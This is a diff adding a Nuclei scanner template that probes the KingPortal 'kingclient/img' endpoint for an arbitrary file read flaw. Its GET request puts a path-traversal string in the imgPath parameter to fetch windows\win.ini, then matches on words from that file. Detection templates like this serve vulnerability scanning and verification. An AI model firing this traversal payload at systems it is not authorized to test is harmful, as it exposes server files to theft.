@@ -1,0 +1,29 @@
+id: KingPortal-win-ini
+
+info:
+  name: KingPortal开发系统kingclient存在任意文件读取漏洞
+  author: ghosinshell
+  severity: high
+  description: KingPortal开发系统存在任意文件读取漏洞
+  tags: KingPortal
+  reference:
+    - https://github.com/ghosinshell/Nuclei-POC   
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/kingclient/img?imgPath=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+    
+    matchers:
+      - type: word
+        words:
+          - "fonts"
+          - "extensions"
+          - "files"
+          - "Mail"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - ".*"
